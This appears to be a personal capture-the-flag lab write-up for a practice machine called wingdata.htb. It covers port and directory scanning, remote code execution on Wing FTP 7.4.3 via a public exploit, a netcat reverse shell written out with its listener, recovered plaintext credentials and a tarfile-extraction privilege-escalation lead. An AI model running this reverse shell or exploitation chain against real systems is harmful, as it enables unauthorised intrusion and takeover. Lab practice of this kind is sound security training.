---
tags:
banner:
publish: false
---
```
nmap -p- -sV -sC 10.129.8.66
```

port 22: OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)

port 80: Apache httpd 2.4.66

# website
Uses jQuery 3.3.1, bootstrap 5.0.0

website is only one page, with a button leading to an ftp server.

Ftp server is running wing FTP server 7.4.3

```
gobuster dir --url http://wingdata.htb --wordlist /usr/share/wordlists/dirb/common.txt
```
Command revealed an `assets/` and `vendor/` sub-page. both pages are forbidden.

## Ftp subdomain
gobuster on ftp subdomain revealed nothing of value.

wing ftp 7.4.3 has an [exploit](https://www.exploit-db.com/exploits/52347) of remote code execution (CVE-2025-47812).

running the exploit allows me to run code on the server

[reverse shell generator](https://www.revshells.com/) gave me access.
```bash
nc 10.10.14.110 5555 -e /bin/bash
```
and
```bash
nc -lvnp 5555
```

the shell looks a bit funky though. Stabalize it by running
```bash
/usr/bin/script -qc /bin/bash /dev/null
```

inside the `/opt/wftpserver/Data/1/users` folder is the `wacky` user, which is the same as the one in the home folder. this has the password hash of the user.

anonymous login is also enabled.

localhost ran mysql database on port `3306` username `root`, no password.

ssh username wftp_default_ssh, maybe?

ftp login `wacky`, password `!#7Blushing^*Bride5`, same for ssh.

only root privilege there is, is running a python script. the python script bulk-extracts tarballs.

it inputs any file and extracts it with root perms.

the python script runs `tar.extractall()` using `filter=data` as its filter…[cve moment](https://www.penligent.ai/hackinglabs/cve-2025-4517-the-python-tar-extraction-bug-that-breaks-trust-boundaries-in-real-automation/)

https://github.com/estebanzarate/CVE-2025-4517-Python-tarfile-filter-data-Bypass-PoC





